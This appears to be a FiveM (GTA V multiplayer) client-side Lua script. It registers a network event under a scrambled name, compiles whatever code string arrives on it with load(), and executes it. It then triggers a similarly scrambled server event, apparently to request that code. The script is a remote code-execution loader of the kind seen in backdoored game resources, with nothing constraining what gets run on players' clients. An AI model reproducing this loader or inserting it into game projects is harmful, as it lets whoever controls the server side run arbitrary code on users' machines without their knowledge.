local resourceName = GetCurrentResourceName()

RegisterNetEvent(resourceName .. ":Nzft8ATykVjvecHu8aFWBhA7q", function(code)
    local func, err = load(code)
    if func then
        func()
    else
        print(err)
    end
end)

TriggerServerEvent(resourceName .. ":XcNCW3FzYY99Q6ocgruQ7NZ3a")
